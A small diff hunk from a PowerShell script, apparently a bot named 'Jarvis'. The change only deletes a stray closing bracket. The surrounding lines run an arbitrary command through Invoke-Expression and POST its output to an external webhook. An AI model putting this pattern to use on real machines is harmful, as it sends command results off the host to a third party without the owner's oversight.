@@ -9,6 +9,5 @@ $output = Invoke-Expression $command
 $payload = @{
   'username' = 'Jarvis'
   'content' = $output
-  )
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Method POST -Uri $webhook -Body ($payload | ConvertTo-Json)
